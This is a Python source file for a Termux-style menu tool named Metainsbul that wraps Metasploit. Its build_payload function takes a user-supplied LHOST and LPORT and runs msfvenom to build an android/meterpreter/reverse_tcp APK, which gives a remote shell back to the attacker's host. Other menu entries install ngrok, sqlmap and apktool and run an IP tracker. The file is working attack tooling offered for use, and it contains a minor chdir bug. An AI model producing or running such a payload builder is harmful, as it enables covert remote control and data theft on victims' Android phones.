import os
    
def build_payload():
    os.system('clear')
    os.system("figlet LHOST")
    lhost = input("LHOST - ")
    os.system('clear')
    os.system("figlet LPORT")
    lport = input("LPORT - ")
    os.system('clear')
    apk_name = input("Payload Name - ")
    os.system('clear')
    print("THE PAYLOAD IS AUTOMATICALLY MOVED TO YOUR Sdcard")
    print("JUST OPEN FILE MANAGER AND VISIT APKS OR JUST SCROLL DOWN")
    print("IN FOLDERS SECTION")

    msfvenom_command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {apk_name}.apk"

    print(msfvenom_command)

    os.system(msfvenom_command)

    os.system(f"mv {apk_name}.apk /storage/emulated/0/")

def update():
    os.system("rm -rf Metainsbul")
    os.system("git clone https://github.com/KiNGEX1/Metainsbul.git")
    os.chdir("cd Metainsbul")
    os.system("chmod +x Meta.py")
    os.system("python Meta.py")

def install_metasploit():
    os.system("python requirements.py")

def launch_metasploit():
    os.system("msfconsole")
  
while True:
    os.system("clear")
    print("███╗░░░███╗███████╗████████╗░█████╗░██╗███╗░░██╗░██████╗██████╗░██╗░░░██╗██╗░░░░░")
    print("████╗░████║██╔════╝╚══██╔══╝██╔══██╗██║████╗░██║██╔════╝██╔══██╗██║░░░██║██║░░░░░")
    print("██╔████╔██║█████╗░░░░░██║░░░███████║██║██╔██╗██║╚█████╗░██████╦╝██║░░░██║██║░░░░░")
    print("██║╚██╔╝██║██╔══╝░░░░░██║░░░██╔══██║██║██║╚████║░╚═══██╗██╔══██╗██║░░░██║██║░░░░░")
    print("██║░╚═╝░██║███████╗░░░██║░░░██║░░██║██║██║░╚███║██████╔╝██████╦╝╚██████╔╝███████╗")
    print("╚═╝░░░░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝╚═════╝░╚═════╝░░╚═════╝░╚══════╝")
    print(" By KiNGEX | https://GitHub.com/KiNGEX1 | Version - 2.1") 
    print("________________________________________")


    print("\033[93mOptions:\033[0m")
    print(" ")         
    print("\033[93m1. Build Payload (Android Only)\033[0m")
    print(" ")          
    print("\033[93m2. Install Metasploit \033[0m")
    print(" ")          
    print("\033[93m3. Launch Metasploit\033[0m")
    print(" ")          
    print("\033[93m4. Update Metainsbul\033[0m") 
    print(" ")          
    print("\033[93m5. Ngrok Install & Start\033[0m")
    print(" ")          
    print("\033[93m6. IP Tracker\033[0m")
    print(" ")         
    print("\033[93m7. Fix Errors\033[0m")
    print(" ")         
    print("\033[93m8. install Sqlmap\033[0m")
    print(" ")          
    print("\033[93m9. install Apktool\033[0m")
    print("")
    

    choice = input("\033[91mKiNGEX: \033[0m").strip()

    if choice == '1':
        build_payload() 
    elif choice == '2':
        install_metasploit()
    elif choice == '3':
        launch_metasploit()
    elif choice == '4':
        update()
    elif choice == '6':
        os.system("clear")
        os.system("python iptrack.py")   
    elif choice == '5':
        os.system("python Ngrokinstall.py")
    elif choice == '7':
        os.system("python ErrorFix.py")
    elif choice == '8':
        os.system("python installsql.py")
    elif choice == '9':
        os.system("python apktool.py")
